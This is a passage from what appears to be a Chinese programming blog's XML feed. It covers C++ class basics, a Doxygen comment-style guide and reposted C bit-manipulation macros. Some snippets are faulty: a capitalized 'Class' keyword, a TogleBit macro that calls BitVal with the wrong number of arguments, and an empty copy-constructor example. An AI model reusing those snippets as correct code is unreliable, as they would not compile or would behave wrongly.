class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">int</span> month;<span class="hljs-comment">//全局变量</span><br><span class="hljs-type">int</span> day;<br><span class="hljs-type">int</span> year;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Set</span><span class="hljs-params">(<span class="hljs-type">int</span> m,<span class="hljs-type">int</span> d,<span class="hljs-type">int</span> y)</span></span><br><span class="hljs-function"></span>&#123;<br>    ::year=y; <span class="hljs-comment">//给全局变量赋值，此处可省略</span><br>    ::day=d;<br>    ::month=m;<br>&#125;<br><br>Class Tdate<br>&#123;<br>    <span class="hljs-keyword">public</span>:<br>        <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Set</span><span class="hljs-params">(<span class="hljs-type">int</span> m,<span class="hljs-type">int</span> d,<span class="hljs-type">int</span> y)</span> <span class="hljs-comment">//成员函数</span></span><br><span class="hljs-function">        </span>&#123;<br>            ::<span class="hljs-built_in">Set</span>(m,d,y); <span class="hljs-comment">//非成员函数</span><br>        &#125;<br>    <span class="hljs-keyword">private</span>:<br>        <span class="hljs-type">int</span> month;<br>        <span class="hljs-type">int</span> day;<br>        <span class="hljs-type">int</span> year;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>关于C++中的<code>inline</code>关键字. 这个关键字只有用在函数的定义前才有用, 放在函数的声明前无法保证这个函数是内联函数.</p></li></ol><h1 id="初始化方法"><a href="#初始化方法" class="headerlink" title="初始化方法"></a>初始化方法</h1><p>在c++中支持两种初始化方式：</p><ul><li>拷贝初始化</li><li>直接初始化<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">A <span class="hljs-title">x</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span></span>;　　<span class="hljs-comment">//直接初始化，调用构造函数</span><br>A y = x;　　<span class="hljs-comment">//拷贝初始化，调用拷贝构造函数</span><br></code></pre></td></tr></table></figure></li></ul><h1 id="类访问修饰符"><a href="#类访问修饰符" class="headerlink" title="类访问修饰符"></a>类访问修饰符</h1><p>在C++中有三种类访问修饰符:</p><ul><li>public公共的</li><li>private私有的</li><li>protected受保护的</li></ul><p>一个类可以有多个 public、protected 或 private 标记区域。每个标记区域在下一个标记区域开始之前或者在遇到类主体结束右括号之前都是有效的。成员和类的默认访问修饰符是 private。</p><h2 id="public"><a href="#public" class="headerlink" title="public"></a>public</h2><p>这个没什么好讲的, 就是都可以访问</p><h2 id="private"><a href="#private" class="headerlink" title="private"></a>private</h2><p><strong>私有</strong>成员变量或函数在类的外部是不可访问的，甚至是不可查看的。<strong>只有类和友元函数可以访问私有成员。</strong></p><p>实际操作中，我们一般会在私有区域定义数据，在公有区域定义相关的函数，以便在类的外部也可以调用这些函数</p><p>修改私有变量的方法:</p><ul><li>通过友元函数</li><li>通过类中的函数, 尽管这个函数是公共的而数据是私有的. 将函数定义为<code>public</code>, 将数据定义为<code>private</code>. 使用这个函数来更改数据是正确的. </li><li>使用指针访问私有变量:<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">a</span>    <span class="hljs-comment">// 定义了类a</span><br>&#123;<br>    <span class="hljs-type">long</span> a0;   <span class="hljs-comment">// 定义私有成员 a0</span><br>    <span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">a</span>(<span class="hljs-type">long</span> b)<br>    &#123;<br>        a0=b;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">geta</span><span class="hljs-params">()</span></span><br><span class="hljs-function">    </span>&#123;<br>        cout&lt;&lt;a0&lt;&lt;endl;<br>    &#125;<br>&#125;;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-function">a <span class="hljs-title">b</span><span class="hljs-params">(<span class="hljs-number">5</span>)</span></span>;          <span class="hljs-comment">// 定义对象b，并给 b 中的 a0 赋初值</span><br>    <span class="hljs-type">long</span> *p;<br>    p=(<span class="hljs-type">long</span>*)&amp;b;     <span class="hljs-comment">// 令指针 p 指向 b 中前 4 个字节，在这里相当于指向 a0</span><br>    b.<span class="hljs-built_in">geta</span>();        <span class="hljs-comment">// 用内部函数访问 a0</span><br>    cout&lt;&lt;*p&lt;&lt;endl;  <span class="hljs-comment">// 在外部直接访问 a0</span><br>    *p=<span class="hljs-number">8</span>;            <span class="hljs-comment">// 在外部改变 a0 的值</span><br>    b.<span class="hljs-built_in">geta</span>();        <span class="hljs-comment">// 输出改变后的结果</span><br>    cout&lt;&lt;*p&lt;&lt;endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">//需要注意的是，使用这种方法虽然可以用于基于类的多态原则的一些程序开发，但违反了类的封装原则，在使用指针的类中也极不安全，所以不建议使用。</span><br></code></pre></td></tr></table></figure></li></ul><h2 id="protected"><a href="#protected" class="headerlink" title="protected"></a>protected</h2><p>受保护类型的成员对象或者是函数, 和私有类型非常相似. 但有一点不同，protected（受保护）成员在派生类（即子类）中是可访问的。<strong>注意, 这个子类可访问是只可以在这个子类中使用, 出了这个子类就无法使用了</strong>.</p><h2 id="子类的三种继承"><a href="#子类的三种继承" class="headerlink" title="子类的三种继承"></a>子类的三种继承</h2><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202401220154130.png"></p><p>例子如下:<br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202401220155298.png"></p><h2 id="初始化列表"><a href="#初始化列表" class="headerlink" title="初始化列表"></a>初始化列表</h2><p>在类的初始化中, 还可以使用C++提供的初始化列表来进行初始化:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++">C::<span class="hljs-built_in">C</span>( <span class="hljs-type">double</span> a, <span class="hljs-type">double</span> b, <span class="hljs-type">double</span> c): <span class="hljs-built_in">X</span>(a), <span class="hljs-built_in">Y</span>(b), <span class="hljs-built_in">Z</span>(c)<br>&#123;<br>  ....<br>&#125;<span class="hljs-comment">//假设有一个类 C，具有多个字段 X、Y、Z 等需要进行初始化，同理地，您可以使用上面的语法，只需要在不同的字段使用逗号进行分隔</span><br></code></pre></td></tr></table></figure><p>使用初始化列表来初始化的时候, 初始化的顺序是按照类中的声明顺序来初始化的. 而不是按照你在<code>:</code> 后写的顺序:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">CMyClass</span> &#123;<br>    <span class="hljs-built_in">CMyClass</span>(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y);<br>    <span class="hljs-type">int</span> m_x;<br>    <span class="hljs-type">int</span> m_y;<br>&#125;;<br><br>CMyClass::<span class="hljs-built_in">CMyClass</span>(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y) : <span class="hljs-built_in">m_y</span>(y), <span class="hljs-built_in">m_x</span>(m_y)<br>&#123;<br>&#125;;<br></code></pre></td></tr></table></figure><p>这里初始化是先m_x然后m_y,并不是你写的这个顺序. 所以上面这样写是有错误的. 关于这个初始化的错误没有什么好的方法来防止. 你必须确保<code>:</code>后面的顺序和你定义的顺序一致. </p><h2 id="析构函数和构造函数"><a href="#析构函数和构造函数" class="headerlink" title="析构函数和构造函数"></a>析构函数和构造函数</h2><p>构造函数是在创建一个类的对象是执行的函数, 而析构函数则是删除对象时执行的函数. 二者都是类中的特殊函数. </p><h3 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h3><p>构造函数位于类中, 和类同名并且不会返回任务类型包括<code>void</code>. 构造函数模式情况下是没有参数的, 但是其也可以添加参数. </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">man</span> &#123;<br><br><span class="hljs-keyword">public</span>:<br><span class="hljs-built_in">man</span>(string myname);<br><br><span class="hljs-keyword">private</span>:<br>string name;<br>&#125;<br><br>man::<span class="hljs-built_in">man</span>(string myname)&#123;<br>name = myname;<span class="hljs-comment">//使用构造函数来初始化</span><br>&#125;<br></code></pre></td></tr></table></figure><p>一个类中可以有多个构造函数:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Matrix</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">Matrix</span>(<span class="hljs-type">int</span> row, <span class="hljs-type">int</span> col);                                            <span class="hljs-comment">//普通构造函数</span><br>    <span class="hljs-built_in">Matrix</span>(<span class="hljs-type">const</span> Matrix&amp; matrix);                                        <span class="hljs-comment">//拷贝构造函数</span><br>    <span class="hljs-built_in">Matrix</span>();                                                            <span class="hljs-comment">//构造空矩阵的构造函数</span><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span>;<br>    ~<span class="hljs-built_in">Matrix</span>();<span class="hljs-comment">//一个析构函数</span><br>&#125;;<br></code></pre></td></tr></table></figure><h4 id="拷贝构造函数"><a href="#拷贝构造函数" class="headerlink" title="拷贝构造函数"></a>拷贝构造函数</h4><p>拷贝构造函数是一种特殊的构造函数, 一般用来初始化新的类。在下面三种情况下会调用拷贝构造函数：</p><ul><li>一个对象以值传递的方法作为函数的参数传递</li><li>一个对象以值传递的方式作为函数的返回值</li><li>一个对象需要通过另一个对象进行初始化</li></ul><p>实例：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++"><br><br></code></pre></td></tr></table></figure><h3 id="析构函数"><a href="#析构函数" class="headerlink" title="析构函数"></a>析构函数</h3><p>析构函数和构造函数一样, 和类同名, 但是需要使用一个<code>~</code>来标识一个析构函数, 它不会返回任何类型, 也无法有任何参数.</p><p><strong>一个类中只可以有一个析构函数</strong></p><h1 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h1><h1 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h1><p>和C语言相比，C++提供了面对对象编程的相关数据类型。</p><h1 id="数组和vector"><a href="#数组和vector" class="headerlink" title="数组和vector"></a>数组和vector</h1><p>这两者都是一块内存空间。向量的使用方式和数组差不多，但是声明的方式不一样。vector是一个模板类，所有在使用vector时需要添加<code>include &lt;vector&gt;</code>。其声明方式如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++">vector&lt;<span class="hljs-type">int</span>&gt;<span class="hljs-built_in">name</span> (size)<span class="hljs-comment">//&lt;&gt;中的是向量中的类型，()中是向量里的数据个数</span><br></code></pre></td></tr></table></figure><h1 id="vector"><a href="#vector" class="headerlink" title="vector"></a>vector</h1><p>这个是c++中的一个模板类，但是其是残缺的，必须要使用<code>&lt;type&gt;</code>来指定这个vector的类型，以成为完整的模板类。</p><p>由于向量是一个类，所以其还定义了许多成员函数。</p><h1 id="面对对象编程"><a href="#面对对象编程" class="headerlink" title="面对对象编程"></a>面对对象编程</h1><p>C++ 在 C 语言的基础上增加了面向对象编程，C++ 支持面向对象程序设计。类是 C++ 的核心特性，通常被称为用户定义的类型。</p><p>类用于指定对象的形式，是一种用户自定义的数据类型，它是一种封装了数据和函数的组合。类中的数据称为成员变量，函数称为成员函数。<strong>类可以被看作是一种模板，可以用来创建具有相同属性和行为的多个对象。</strong></p><p>关于类，其实就是一个蓝图，或者是用户自己定义的类型。语法如下：</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202401220104285.png"></p><h2 id="类的使用"><a href="#类的使用" class="headerlink" title="类的使用"></a>类的使用</h2><ol><li>类中默认的类访问修饰符是<code>private</code> 的，非本类对象无法访问除开<code>public</code>之外二点修饰符。但是具有其他的方法可以访问</li><li>类中的函数是可以直接使用该类中的其他参数的。</li><li><code>this</code>指针, 在一个类中, 由于还不知道这个类的实际对象名称是什么, 所以引用了<code>this</code>指针来指代自己. 在类中函数中, 只要是非静态成员函数, 编译器都会在编译时加上这个<code>this</code>指针作为隐藏参数, 这就是为什么类中的函数可以直接访问类中的数据.</li></ol><p>使用实例：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">man</span>&#123;<br>    <span class="hljs-keyword">public</span>:<br>        <span class="hljs-type">int</span> age;<br>        string name;<br>        string sex;<br>        string legth;<br><br>        <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">printf_age</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span>;<br><br>        <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">printf_string</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span>;<br><br>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">man::printf_string</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    cout &lt;&lt; name &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span> &lt;&lt; sex &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span> &lt;&lt; legth &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;<br>    <span class="hljs-keyword">return</span> ;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">man::printf_age</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    cout &lt;&lt; age &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;    <br>    <span class="hljs-keyword">return</span> ;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span> <span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;   <br>    string name;<br>    <br>    man ysc;<br><br>    ysc.age = <span class="hljs-number">21</span>;<br>    ysc.name = <span class="hljs-string">&quot;yanshichang&quot;</span>;<br>    ysc.sex = <span class="hljs-string">&quot;nan&quot;</span>;<br>    ysc.legth = <span class="hljs-string">&quot;176&quot;</span>;<br><br>    ysc.<span class="hljs-built_in">printf_age</span>();<br>    ysc.<span class="hljs-built_in">printf_string</span>();<br><br>    cout &lt;&lt; <span class="hljs-string">&quot;places input your name &quot;</span> &lt;&lt; endl;<br><br>    cin &gt;&gt; name;<br><br>    cout &lt;&lt; name &lt;&lt; endl;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>C++</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Doxygen注释规范</title>
    <link href="/2024/02/03/Doxygen%E6%B3%A8%E9%87%8A%E8%A7%84%E8%8C%83/"/>
    <url>/2024/02/03/Doxygen%E6%B3%A8%E9%87%8A%E8%A7%84%E8%8C%83/</url>
    
    <content type="html"><![CDATA[<p>Doxygen注释规范 </p><span id="more"></span><h1 id="Doxygen-注释规范"><a href="#Doxygen-注释规范" class="headerlink" title="Doxygen 注释规范"></a>Doxygen 注释规范</h1><h2 id="文件头标注展开目录"><a href="#文件头标注展开目录" class="headerlink" title="文件头标注展开目录"></a>文件头标注展开目录</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/****************************************************************************</span><br><span class="hljs-comment"> *   Copyright (C) 2018 by Doxygen C Comment                                *</span><br><span class="hljs-comment"> *                                                                          *</span><br><span class="hljs-comment"> *   This file is part of Box.                                              *</span><br><span class="hljs-comment"> *                                                                          *</span><br><span class="hljs-comment"> *   Box is free software: you can redistribute it and/or modify it         *</span><br><span class="hljs-comment"> *   under the terms of the GNU Lesser General Public License as published  *</span><br><span class="hljs-comment"> *   by the Free Software Foundation, either version 3 of the License, or   *</span><br><span class="hljs-comment"> *   (at your option) any later version.                                    *</span><br><span class="hljs-comment"> *                                                                          *</span><br><span class="hljs-comment"> *   Box is distributed in the hope that it will be useful,                 *</span><br><span class="hljs-comment"> *   but WITHOUT ANY WARRANTY; without even the implied warranty of         *</span><br><span class="hljs-comment"> *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the          *</span><br><span class="hljs-comment"> *   GNU Lesser General Public License for more details.                    *</span><br><span class="hljs-comment"> *                                                                          *</span><br><span class="hljs-comment"> *   You should have received a copy of the GNU Lesser General Public       *</span><br><span class="hljs-comment"> *   License along with Box.  If not, see &lt;http://www.gnu.org/licenses/&gt;.   *</span><br><span class="hljs-comment"> ****************************************************************************/</span><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * @file doxygen_c.h</span><br><span class="hljs-comment"> * @author someone</span><br><span class="hljs-comment"> * @date 2018.1.4</span><br><span class="hljs-comment"> * @brief doxygen 规范的 C 文件注释规范文档，可以换行，</span><br><span class="hljs-comment"> * 所有 brief 同</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * @details 对该文档的详细说明和解释，可以换行，</span><br><span class="hljs-comment"> * 所有详细说明同</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;hearder.h&quot;</span></span><br></code></pre></td></tr></table></figure><h2 id="结构体、枚举类型标注展开目录"><a href="#结构体、枚举类型标注展开目录" class="headerlink" title="结构体、枚举类型标注展开目录"></a>结构体、枚举类型标注展开目录</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * @brief 简要说明</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * @details 详细说明</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">BoxEnum_enum</span> &#123;</span><br>  BOXENUM_FIRST,  <span class="hljs-comment">/**&lt; Some documentation for first. */</span><br>  BOXENUM_SECOND, <span class="hljs-comment">/**&lt; Some documentation for second. */</span><br>  BOXENUM_ETC     <span class="hljs-comment">/**&lt; Etc. */</span><br>&#125; BoxEnum;<br></code></pre></td></tr></table></figure><h2 id="函数头注释展开目录"><a href="#函数头注释展开目录" class="headerlink" title="函数头注释展开目录"></a>函数头注释展开目录</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * @brief 函数简要说明，可以换行</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * @details 对函数的详细说明和解释，可以换行</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * @note 注意事项内容</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * @param index 说明文字</span><br><span class="hljs-comment"> * @param cent 说明文字</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * @return 描述函数返回的内容</span><br><span class="hljs-comment"> * @retval 1 测试成功</span><br><span class="hljs-comment"> * @retval -1 测试失败</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">bool</span> <span class="hljs-title function_">Test</span><span class="hljs-params">(<span class="hljs-type">int</span> index, <span class="hljs-type">char</span> *cent)</span>;<br></code></pre></td></tr></table></figure><h2 id="变量注释展开目录"><a href="#变量注释展开目录" class="headerlink" title="变量注释展开目录"></a>变量注释展开目录</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> element = <span class="hljs-number">0</span>; <span class="hljs-comment">/**&lt; 变量简单说明 */</span><br></code></pre></td></tr></table></figure><figure class="highlight zephir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs zephir"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@brief</span> 变量简要说明</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@details</span> 变量详细说明</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> variable = <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure><h2 id="宏注释展开目录"><a href="#宏注释展开目录" class="headerlink" title="宏注释展开目录"></a>宏注释展开目录</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * @brief 宏简要说明</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * @details 宏详细说明</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> variable 10</span><br></code></pre></td></tr></table></figure><h2 id="参考与致谢"><a href="#参考与致谢" class="headerlink" title="参考与致谢"></a>参考与致谢</h2><ul><li><a href="https://www.liuguogy.com/archives/doxygen-c-brief-annotation.html">基于 Doxygen 的 C 语言简要注释规范</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>如何读写单个bit</title>
    <link href="/2024/02/03/%E5%A6%82%E4%BD%95%E8%AF%BB%E5%86%99%E5%8D%95%E4%B8%AAbit/"/>
    <url>/2024/02/03/%E5%A6%82%E4%BD%95%E8%AF%BB%E5%86%99%E5%8D%95%E4%B8%AAbit/</url>
    
    <content type="html"><![CDATA[<p>如何读写单个bit</p><span id="more"></span><h1 id="如何读写单个-bit"><a href="#如何读写单个-bit" class="headerlink" title="如何读写单个 bit"></a>如何读写单个 bit</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> BitVal(data,y) ( (data&gt;&gt;y) &amp; 1)             <span class="hljs-comment">// Return Data.Y value</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SetBit(data,y)    data |= (1 &lt;&lt; y)          <span class="hljs-comment">// Set Data.Y to 1</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ClearBit(data,y)  data &amp;= ~(1 &lt;&lt; y)         <span class="hljs-comment">// Clear Data.Y to 0</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TogleBit(data,y)     (data ^=BitVal(y))     <span class="hljs-comment">// Togle Data.Y value</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> Togle(data)   (data =~data )                <span class="hljs-comment">// Togle Data value</span></span><br></code></pre></td></tr></table></figure><p>例如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">uint8_t</span> number = <span class="hljs-number">0x05</span>; <span class="hljs-comment">//0b00000101</span><br><span class="hljs-type">uint8_t</span> bit_2 = BitVal(number,<span class="hljs-number">2</span>); <span class="hljs-comment">// bit_2 = 1</span><br><span class="hljs-type">uint8_t</span> bit_1 = BitVal(number,<span class="hljs-number">1</span>); <span class="hljs-comment">// bit_1 = 0</span><br><br>SetBit(number,<span class="hljs-number">1</span>); <span class="hljs-comment">// number =  0x07 =&gt; 0b00000111</span><br>ClearBit(number,<span class="hljs-number">2</span>); <span class="hljs-comment">// number =0x03 =&gt; 0b0000011</span><br></code></pre></td></tr></table></figure><h2 id="参考与致谢"><a href="#参考与致谢" class="headerlink" title="参考与致谢"></a>参考与致谢</h2><ul><li><a href="https://stackoverflow.com/questions/11815894/how-to-read-write-arbitrary-bits-in-c-c">How to read&#x2F;write arbitrary bits in C&#x2F;C++</a></li></ul><blockquote><p>原文地址：<a href="https://wiki-power.com/">https://wiki-power.com/</a><br>本篇文章受 <a href="https://creativecommons.org/licenses/by/4.0/deed.zh">CC BY-NC-SA 4.0</a> 协议保护，转载请注明出处。</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>stm32中的电源管理</title>
    <link href="/2024/01/31/stm32%E4%B8%AD%E7%9A%84%E7%94%B5%E6%BA%90%E7%AE%A1%E7%90%86/"/>
    <url>/2024/01/31/stm32%E4%B8%AD%E7%9A%84%E7%94%B5%E6%BA%90%E7%AE%A1%E7%90%86/</url>
    
